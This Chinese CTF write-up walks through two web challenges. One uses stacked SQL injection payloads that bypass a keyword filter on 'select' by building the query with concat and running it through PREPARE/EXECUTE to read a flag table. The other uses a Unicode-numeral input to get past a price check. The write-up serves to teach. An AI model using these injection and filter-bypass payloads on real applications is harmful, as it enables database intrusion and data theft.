### [强网杯 2019]随便注



注入点是字符型：inject=1'。
注入漏洞类型为：布尔盲注（Boolean-based blind） 和 时间盲注（Time-based blind）。
关键报错：[ERROR] unable to retrieve the number of databases。这是因为题目对特殊的 SQL 关键字（如 select）或符号进行了 WAF 拦截/过滤，导致 sqlmap 无法直接跑出其他数据库，但成功通过盲注拿到了当前数据库名 supersqli。

[强网杯 2019] 随便注 CTF  Web 方向中极其经典的一道 SQL 注入 题目。它完美展示了在严格的关键字过滤（WAF）下，如何利用 MySQL 的堆叠注入 (Stacked Injection) 结合预处理语句或表名重命名来巧妙绕过限制，获取数据。

```sql
1'; show tables;#
```

*回显通常会显示两个表：`1919810931114514` 和 `words`。*

接着，查看这两个表的列名：

```cobol
1'; show columns from `words`;#
1'; show columns from `1919810931114514`;#
```

*回显显示：`words` 表有 `id` 和 `data` 列；而 `1919810931114514` 表里有一个名为 `flag` 的列。我们的目标就是读取这个 `flag`。*

虽然 `select` 被过滤，但我们可以利用 MySQL 的预处理功能，将 SQL 语句拆分成字符串拼接，从而绕过正则匹配。

```sql
1'; Set @sql = concat('se','lect flag from `1919810931114514`'); Prepare stmt from @sql; EXECUTE stmt;#
```

原理解析：

Set @sql = concat('se','lect ...')：将字符串拼接成完整的 select flag from ...，赋值给变量 @sql。因为 select 被拆分成了 'se' 和 'lect'，成功绕过了 WAF 的正则匹配。
Prepare stmt from @sql：将变量 @sql 中的字符串预处理为一条可执行的 SQL 语句，命名为 stmt。
EXECUTE stmt：执行这条预处理语句。此时 MySQL 引擎会执行完整的 select 语句，并将结果直接回显到页面上。



### **[ASIS 2019]Unicorn shop**

就说一下题目大致内容，首先进入到靶场之后，只有显示一个界面，看到一张独角兽的图片，一个表格，表格四栏，分别对应四个id和四个不同的价格。表格下方是一个表单，里面两个输入框分别是id和price。

看样子这题的大致解法是输入id和price，买下最贵的ultra unicorn。查看网页源码得到提示

<meta charset="utf-8"><!--Ah,really important,seriously. -->


utf-8这个编码很重要，说明可能存在编码不一致的情况。

如果直接输入id=4&&price=1337，会在页面上报错

```
Only one char(?) allowed!
```

如果将price参数留空会出现

```python
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/site-packages/tornado/web.py", line 1541, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File "/app/sshop/views/Shop.py", line 34, in post
    unicodedata.numeric(price)
TypeError: need a single Unicode character as parameter
```

所以得出前端使用的是utf-8，然而后端采用的是Unicode的结论。那么就需要一个Unicode的单字符>=1337即可。

在网上的找到这个网址https://www.compart.com/en/unicode/plane，Aegean Number Three Thousand：𐄤

将这个字符输入到price，id=4&price=𐄤获得flag
